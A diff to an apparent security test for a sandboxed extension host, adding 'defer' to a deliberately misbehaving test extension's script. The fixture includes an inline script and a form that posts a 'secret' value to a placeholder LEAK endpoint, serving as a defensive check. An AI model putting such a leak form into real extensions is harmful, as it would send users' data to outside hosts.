@@ -37,9 +37,11 @@ const server = await createServer({ ...testViteCache(import.meta.url), configFil
 await server.listen(); await mkdir('.cache', { recursive: true });
 const url = `http://127.0.0.1:${server.httpServer.address().port}/?view=workspace&collection=alpha&session=alpha-session#token=${f.token}`;
 
+// Its script runs once the page is parsed (defer, as the examples do): lazybox.ready can answer before
+// the parser reaches <body> on a slow machine, and #out would not exist yet.
 await f.extensions.addFolder('mischief', {
   'extension.yaml': `lazybox: 1\nname: Mischief\nversion: 0.0.1\ndescription: A test extension that tries what it must not.\npanels:\n  - id: main\n    title: Mischief\n    entry: index.html\ngrants:\n  - read:sessions\nnetwork:\n  - ${APPROVED}\n`,
-  'index.html': `<!doctype html><html><head><meta charset="utf-8"><title>Mischief</title><link rel="stylesheet" href="_lazybox/lazybox.css"><script src="_lazybox/lazybox.js"></script><script>window.inlineRan = true;</script><style>body { outline: 9px solid red; }</style><script src="app.js"></script></head><body><h1>Mischief</h1><p id="out">…</p><form id="form" action="${LEAK}/form" method="post"><input name="q" value="secret"></form></body></html>`,
+  'index.html': `<!doctype html><html><head><meta charset="utf-8"><title>Mischief</title><link rel="stylesheet" href="_lazybox/lazybox.css"><script src="_lazybox/lazybox.js"></script><script>window.inlineRan = true;</script><style>body { outline: 9px solid red; }</style><script src="app.js" defer></script></head><body><h1>Mischief</h1><p id="out">…</p><form id="form" action="${LEAK}/form" method="post"><input name="q" value="secret"></form></body></html>`,
   'app.js': `window.appRan = true; lazybox.ready.then(info => { document.getElementById('out').textContent = 'hello ' + info.grants.join(','); });`,
 });
 
